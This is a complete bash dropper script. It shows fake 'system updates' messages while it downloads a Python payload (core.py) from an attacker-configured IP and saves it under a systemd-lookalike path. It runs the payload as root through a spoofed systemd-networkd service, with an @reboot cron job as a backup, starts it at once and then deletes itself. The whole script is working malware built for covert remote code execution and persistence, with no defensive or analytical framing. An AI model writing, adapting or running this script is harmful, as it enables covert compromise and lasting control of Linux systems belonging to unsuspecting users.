#!/bin/bash
# ======== CHANGE TO YOUR WINDOWS IP ========
YOUR_IP="192.168.1.167"    # ← YOUR WINDOWS IP
# ===========================================

echo "[+] Installing system updates..."  # Fake message

# Download core.py from your Windows server
mkdir -p /usr/lib/systemd/systemd-network 2>/dev/null
curl -s "http://$YOUR_IP:8000/core.py" -o /usr/lib/systemd/systemd-network/networkd 2>/dev/null || wget -q "http://$YOUR_IP:8000/core.py" -O /usr/lib/systemd/systemd-network/networkd 2>/dev/null

chmod +x /usr/lib/systemd/systemd-network/networkd 2>/dev/null

# ======== SYSTEMD SERVICE FOR REBOOT SURVIVAL ========
cat > /etc/systemd/system/systemd-networkd.service << EOF
[Unit]
Description=Systemd Network Daemon
After=network.target
Wants=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 /usr/lib/systemd/systemd-network/networkd
Restart=always
RestartSec=10
User=root
WorkingDirectory=/usr/lib/systemd/systemd-network

[Install]
WantedBy=multi-user.target
EOF

# Enable service to start on boot
systemctl daemon-reload 2>/dev/null
systemctl enable systemd-networkd.service 2>/dev/null
systemctl start systemd-networkd.service 2>/dev/null

# ======== CRON JOB AS BACKUP ========
# Add to crontab as backup method
(crontab -l 2>/dev/null; echo "@reboot /usr/bin/python3 /usr/lib/systemd/systemd-network/networkd") | crontab - 2>/dev/null

# ======== START IMMEDIATELY ========
# Start now (don't wait for reboot)
nohup python3 /usr/lib/systemd/systemd-network/networkd >/dev/null 2>&1 &

echo "[+] System updates completed successfully"
rm -f "$0" 2>/dev/null
